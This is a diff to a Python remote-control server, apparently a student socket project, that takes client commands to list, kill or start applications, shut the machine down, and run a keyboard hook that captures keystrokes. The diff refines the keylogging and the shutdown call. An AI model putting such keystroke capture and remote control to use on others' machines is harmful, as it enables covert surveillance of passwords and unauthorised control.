@@ -113,7 +113,9 @@ def Server_Running():
                         if(str(k) == "Key.backspace"):
                             k = " Backspace "
                         elif(str(k) == "Key.space"):
-                            k = " "                
+                            k = " "
+                        elif(str(k) == "Key.shift"):
+                            k = ""
                         k = str(k).replace("Key.cmd","")                    
                         k = str(k).replace("Key.","")
                         k = str(k).replace("<","")
@@ -169,29 +171,29 @@ def Server_Running():
         t2.join()
     def Recieve_Close():
         import os
-        os.system('shutdown -s -t "time"')
+        os.system('shutdown -s -t 30')
         #time la thoi gian set up tat may tuy y
 
     #Command cho server:
     while True:
-        try:
-            def Command_catch(i):
-                if i == "Xem App": App_running(HOST,PORT)
-                elif i == "Xoa App": 
-                    ID_App = client.recv(1024).decode("utf8") 
-                    App_running_kill(ID_App)
-                elif i == "Bat App":
-                    Name = client.recv(1024).decode("utf8")
-                    App_start(Name)
-                elif i == "Hook Key": hook()
-                elif i == "Shutdown" : Recieve_Close()
-            Command = client.recv(1024).decode("utf8")
-            client.sendall(bytes("Da nhan lenh","utf8"))
-            print(Command)
-            Command_catch(Command)
-        except:
-            print("Disconnected")
-            break
+        #try:
+        def Command_catch(i):
+            if i == "Xem App": App_running(HOST,PORT)
+            elif i == "Xoa App": 
+                ID_App = client.recv(1024).decode("utf8") 
+                App_running_kill(ID_App)
+            elif i == "Bat App":
+                Name = client.recv(1024).decode("utf8")
+                App_start(Name)
+            elif i == "Hook Key": hook()
+            elif i == "Shutdown" : Recieve_Close()
+        Command = client.recv(1024).decode("utf8")
+        client.sendall(bytes("Da nhan lenh","utf8"))
+        print(Command)
+        Command_catch(Command)
+        #except:
+            #print("Disconnected")
+            #break
     server.close()
   
 from tkinter import *
